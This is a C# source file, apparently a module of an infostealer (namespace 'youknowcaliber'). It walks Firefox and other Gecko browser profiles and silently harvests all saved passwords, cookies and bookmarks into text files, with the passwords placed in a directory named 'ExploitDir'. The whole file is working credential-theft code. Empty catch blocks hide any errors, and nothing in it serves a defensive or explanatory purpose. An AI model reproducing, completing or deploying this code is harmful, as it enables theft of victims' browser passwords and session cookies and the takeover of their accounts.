using System;
using System.IO;
using System.Collections.Generic;

namespace youknowcaliber.Firefox
{
    class Recovery
    {
        public static void Run(string sSavePath)
        {
            foreach (string path in Paths.sGeckoBrowserPaths)
            {
                try
                {
                    string name = new DirectoryInfo(path).Name;
                    string bSavePath = sSavePath + "\\" + name;
                    string browser = Paths.appdata + "\\" + path;

                    if (Directory.Exists(browser + "\\Profiles"))
                    {
                        Directory.CreateDirectory(bSavePath);
                        List<Bookmark> bookmarks = Bookmarks.Bookmarks.Get(browser); // Read all Firefox bookmarks
                        List<Cookie> cookies = Cookies.Cookies.Get(browser); // Read all Firefox cookies
                        //List<Site> history = History.History.Get(browser); // Read all Firefox history
                        List<Password> passwords = Passwords.Passwords.Get(browser); // Read all Firefox passwords

                        cBrowserUtils.WriteBookmarks(bookmarks, bSavePath + "\\Bookmarks.txt");
                        cBrowserUtils.WriteCookies(cookies, sSavePath + $"\\Cookies_{name}({GenStrings.GenNumbersTo()}).txt");
                        //cBrowserUtils.WriteHistory(history, bSavePath + "\\History.txt");
                        cBrowserUtils.WritePasswords(passwords, Help.ExploitDir + "\\Passwords.txt");
                    }
                }
                catch { }
            }
        }
    }
}
